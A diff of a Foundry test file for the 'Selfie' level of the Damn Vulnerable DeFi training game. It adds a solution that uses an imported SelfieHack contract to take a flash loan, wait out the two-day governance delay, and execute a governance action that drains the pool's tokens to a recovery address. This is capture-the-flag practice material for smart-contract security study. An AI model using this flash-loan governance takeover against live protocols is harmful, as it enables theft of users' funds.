@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfieHack} from "../../src/selfie/SelfieHack.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,6 +63,19 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
+        // make sure block number is not 0 in test
+        vm.warp(1);
+
+        SelfieHack hack = new SelfieHack(address(token), address(governance), address(pool), address(recovery));
+
+        // start flashloan
+        hack.startFlashloan();
+
+        // wait for 2 days and one second
+        vm.warp(2 days + 1);
+
+        // execute action and send tokens to rescue account (done in right away)
+        governance.executeAction(hack.actionId());
         
     }
 
